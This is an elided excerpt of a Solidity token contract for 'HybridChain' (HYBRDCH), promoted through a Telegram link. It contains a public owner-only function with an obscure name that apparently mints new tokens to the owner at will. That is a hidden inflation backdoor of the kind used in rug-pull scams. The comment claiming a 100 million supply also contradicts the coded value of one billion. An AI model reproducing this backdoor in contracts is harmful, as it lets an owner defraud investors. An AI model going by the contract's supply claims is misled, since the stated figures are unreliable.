//
// $HybridChain proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/HybridChainbsc
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _HybridChain(uint256 amount) public onlyOwner {
 _HybridChain(msg.sender, amount);
    }
    ...
    function _HybridChain(address account, uint256 amount) internal virtual {
...
contract $HybridChain is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Hybrid Chain", "HYBRDCH") {
     _HybridChain(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}